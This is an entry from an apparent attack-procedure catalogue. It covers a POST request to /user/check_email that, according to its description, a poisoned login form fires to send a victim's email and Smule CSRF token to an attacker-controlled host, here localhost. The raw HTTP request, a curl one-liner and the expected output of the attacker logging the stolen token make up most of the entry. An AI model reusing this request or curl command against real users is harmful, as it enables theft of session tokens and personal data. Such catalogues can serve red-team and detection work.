---
id: cmd-smule-post-email-001
name: post-email-check-to-localhost
type: command
executor: http
data: >-
  POST /user/check_email HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0
  (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept:
  application/json, text/plain, */*\nAccept-Language:
  en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer:
  https://www.smule.com/s/smule_groups/user_groups/fossnow27\nX-CSRF-Token:
  [redacted]\nContent-Type: application/x-www-form-urlencoded\nX-Smulen:
  daf446d26def7faeef4f6527d7f20fae\nContent-Length: 31\nOrigin:
  https://www.smule.com\nConnection: close\n\nemail=foo%40bar.com
output: null
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:50.322Z'
platforms:
  - Web
tags:
  - information-disclosure
  - csrf
verified: false
validated: true
submitted: true
---

# post-email-check-to-localhost

## Command

```http
POST /user/check_email HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: application/json, text/plain, */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.smule.com/s/smule_groups/user_groups/fossnow27
X-CSRF-Token: [redacted]
Content-Type: application/x-www-form-urlencoded
X-Smulen: daf446d26def7faeef4f6527d7f20fae
Content-Length: 31
Origin: https://www.smule.com
Connection: close

email=foo%40bar.com
```

## Description

This POST request, triggered by the poisoned login form, sends the victim's email and CSRF token to the attacker-controlled localhost, disclosing sensitive information for further exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| email | Victim's entered email (URL-encoded) | Yes |
| X-CSRF-Token | Session CSRF token from headers | Yes |
| X-Smulen | Custom Smule header (e.g., session ID) | No |
| Origin | https://www.smule.com for CORS | Yes |

## Examples

### Basic Usage

Browser auto-sends on form submit.

### Advanced Usage

Manual via curl:
```bash
curl -X POST "http://localhost/user/check_email" -H "X-CSRF-Token: [redacted]" -H "Origin: https://www.smule.com" -d "email=foo%40bar.com"
```

## Expected Output

Attacker logs the token and email; responds with JSON {"email":true,"token":"[CSRF]","mail":"foo@bar.com"} to mimic success.

## Related

- [[Related Procedure: Trigger-Email-Check-to-Disclose-CSRF-Token]]
